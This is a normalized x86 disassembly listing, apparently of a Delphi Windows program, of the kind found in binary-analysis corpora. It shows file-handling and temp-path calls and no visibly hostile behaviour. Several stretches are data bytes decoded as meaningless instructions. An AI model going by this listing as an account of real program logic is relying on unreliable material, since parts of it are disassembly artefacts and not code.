pop ebp
retn 0xc
sub_4626f0
push ebx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0xc ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0xc ] eax
sub_462750
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_46281d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
push ebp
push j_sub_40386c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_408188
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ax [ ebx + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462824
lea eax [ ebp - 0x10 ]
call sub_404074
retn
sub_462843
inc [ eax ]
add [ eax ] al
add [ esi ] cl
dec ecx
push ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
test esi esi
je r-xdata
arpl [ ebx + 0x57 ] bp
imul ebp [ esi + 0x64 ] 0x9073776f
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
xor eax eax
push ebp
push sub_46294d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405034
xor eax eax
push ebp
push j_sub_403740#3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
push eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
call sub_40426c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor ebx ebx
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ r-xdata ]
call sub_405070
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462954
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405034
retn
mov eax [ ebp - 0x8 ]
mov esi [ eax + ebx * 4 ]
test esi esi
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_40426c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
sub_462917
mov eax [ ebp - 0x4 ]
call sub_4032a0
call sub_403aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462954
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_405034
retn
sub_462978
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_462a12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_404534
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
xor esi esi
jmp r-xdata
or edx 0xffffffff
mov eax ebx
call sub_4616c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + esi * 4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462a19
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404098
retn
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc esi
sub_462a20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov ecx esi
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
pop esi
pop ebx
retn
sub_462a3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_462af2
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
push 0x8000080
push 0x3
push 0x0
push 0x1
push 0x80000000
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
call CreateFileA
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_462ad5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
push ebx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462adc
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
push 0x0
mov eax [ ebp - 0xc ]
push eax
call GetFileSize
mov [ ebp - 0x8 ] eax
sub_462b04
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_462bc7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463368
mov eax [ ebp - 0x8 ]
call sub_408188
mov [ ebx ] al
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463368
mov eax [ ebp - 0xc ]
call sub_408188
mov [ ebx + 0x1 ] al
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463368
mov eax [ ebp - 0x10 ]
call sub_408188
mov [ ebx + 0x2 ] al
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463368
mov eax [ ebp - 0x14 ]
call sub_408188
mov [ ebx + 0x3 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462bce
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404098
retn
sub_462bec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462c7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_4616c8
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_4040c8
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462c81
lea eax [ ebp - 0x18 ]
call sub_404074
retn
sub_462c8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462d1a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax ebx
call sub_4616c8
movzx eax [ ebp - 0x14 ]
mov [ edi ] eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0xc ]
call sub_4040c8
mov ax [ ebp - 0x12 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462d21
lea eax [ ebp - 0x18 ]
call sub_404074
retn
sub_462d2c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0xc
sub_462d4c
push ebp
mov ebp esp
push 0x0
xor ecx ecx
push ebp
push sub_462da6
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp [ eax + 0x4 ] 0x40
jl r-xdata
mov ecx [ eax + 0x4 ]
mov [ eax + ecx * 4 + 0x8 ] edx
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462dad
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_462db4
push ebp
mov ebp esp
push 0x0
push ebx
xor ecx ecx
push ebp
push sub_462e0e
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp edx [ eax + 0x4 ]
jge r-xdata
mov ebx [ eax + edx * 4 + 0x8 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462e15
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_462e1c
push ebx
push esi
mov esi [ eax + 0x4 ]
dec esi
test esi esi
jl r-xdata
pop esi
pop ebx
retn
inc esi
xor ecx ecx
inc ecx
dec esi
jne r-xdata
dec [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
mov edx [ eax + edx * 4 + 0x8 ]
mov [ eax + ecx * 4 + 0x8 ] edx
mov edx [ eax + 0x4 ]
xor ebx ebx
mov [ eax + edx * 4 + 0x8 ] ebx
pop esi
pop ebx
retn
cmp edx [ eax + ecx * 4 + 0x8 ]
jne r-xdata
sub_462e50
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_462ef1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
sub eax 0x2af9
jne r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_46188c
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_405ba4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ef8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
pop eax
call sub_408dbc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4040c8
sub_462f00
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462f39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f40
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sub_462f70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462f95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462f9c
retn
sub_463083
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x63 ] al
add [ eax + 0x3004630 ] dl
adc [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
popad
js r-xdata
dec ecx
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + esi + 0x6d0b0046 ] cl
popad
inc ebp
js r-xdata
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c2d4
pop esi
pop ebx
retn
jo r-xdata
mov eax edx
retn
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
retn 0x90c3
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
hlt
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
bound esp [ ecx + 0x6c ]
shl [ eax ] 0x1
inc esi
add [ ecx ] dl
add ch [ esi ]
cmp [ eax + eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x49080040 ] dl
sub_463214
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_463273
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx 0x104
call sub_4046c0
mov eax [ ebx ]
call sub_404534
push eax
mov eax [ ebx ]
call sub_404334
push eax
call GetTempPathA
mov edx ebx
xchg edx eax
call sub_4046c0
lea edx [ ebp - 0x4 ]
mov eax [ ebx ]
call sub_463114
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46327a
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_463280
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_463349
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_404480
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407cfc
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407cfc
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_404678
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404594
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_4040c8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463350
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404098
retn
push ebx
mov eax edi
call sub_404334
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404594
mov eax ebx
call sub_404074
jmp r-xdata
sub_463368
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_463280
mov eax esi
mov edx r-xdata
call sub_404480
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_404678
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404594
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_4040c8
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_404334
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_404594
jmp r-xdata
mov eax ebx
call sub_404074
jmp r-xdata
sub_46343c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_404334
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_407da4
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_4634c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46357b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463582
retn
mov eax rw-data
call sub_40d01c
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404afc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404afc
mov eax rw-data
call sub_404074
mov eax rw-data
mov edx [ r-xdata ]
call sub_405034
mov eax rw-data
mov edx [ r-xdata ]
call sub_405034
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404afc
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404afc
sub_463584
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_463657
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46365e
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea eax [ ebp - 0x4 ]
call sub_463214
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_4040c8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402de0
jne r-xdata
mov eax sub_40c314
mov [ rw-data ] eax
mov [ rw-data ] sub_463434
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405028
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040c8
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405028
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_4040c8
sub_4637a4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
cmp [ esi ] al
cmp al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
inc esi
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
mov esp 0x18004639
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] cl
cmp [ esi ] eax
test al 0x2a
inc eax
add [ ecx ] dl
push esp
dec ecx
inc ecx
outsb
je r-xdata
xor [ eax ] eax
inc esi
jb r-xdata
test eax 0x8bfff9fc
fimul [ ebx + 0x55c033f0 ]
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46399e
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
push sub_463997
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_41a0e4
test [ esi + 0x1c ] 0x10
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
cmp [ eax ] bh
inc esi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
je r-xdata
sti
push esi
inc esi
sbb al 0x10
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
call sub_4035c4
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
in al dx
aaa
inc esi
add [ edi + esi ] dh
inc esi
add [ esi ] al
add [ eax ] dl
dec ecx
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_4639bc
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a130
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4639e8
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_463a2c
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_463a2c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_463420
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_463a54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463a79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463a80
retn
sub_463da0
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a0e4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_463e12
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_4035c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463e19
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_461808
mov edx [ rw-data ]
mov [ edx ] eax
sub_463e38
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40362c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_41a130
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_463e9f
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463ea6
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d01c
sub_463ec4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_463f6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463f76
lea eax [ ebp - 0x10 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_408dbc
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_408dbc
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_463f80
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_463fb8
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
